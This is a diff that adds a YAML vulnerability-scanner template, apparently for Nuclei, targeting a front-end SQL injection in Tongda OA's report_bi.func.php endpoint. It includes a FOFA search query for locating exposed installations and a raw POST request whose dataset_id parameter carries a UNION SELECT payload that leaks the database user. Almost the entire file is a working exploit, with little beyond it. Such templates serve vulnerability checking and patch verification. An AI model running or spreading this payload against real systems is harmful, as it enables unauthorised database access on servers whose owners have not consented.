@@ -1,0 +1,45 @@
+id: poc-kmg3u3mcq79031z0
+info:
+  name: 通达OA report_bi前台SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kmg3u3mcq79031z0'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kmg3u3mcq79031z0
+    fofa: title="office Anywhere" && icon_hash="-759108386" && "2017"
+http:
+- raw:
+  - 'POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Accept-Encoding: gzip
+
+
+
+
+    _POST[dataset_id]=efgh''-@`''`)union select 1,2,user()#''&action=get_link_info&
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    root
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
